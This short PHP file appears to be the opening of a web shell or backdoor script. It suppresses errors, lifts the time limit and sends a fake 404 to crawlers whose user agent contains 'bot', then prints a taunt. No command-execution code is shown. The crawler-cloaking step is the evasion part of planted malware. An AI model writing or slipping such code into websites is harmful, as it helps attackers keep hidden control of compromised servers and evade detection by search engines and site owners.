<?php
@error_reporting(7);
@session_start();
@set_time_limit(0);
@set_magic_quotes_runtime(0);
if( strpos( strtolower( $_SERVER['HTTP_USER_AGENT'] ), 'bot' ) !== false ) {
	header('HTTP/1.0 404 Not Found');
	exit;
}
ob_start();
echo "fuxx";
$mtime = explode(' ', microtime());
?>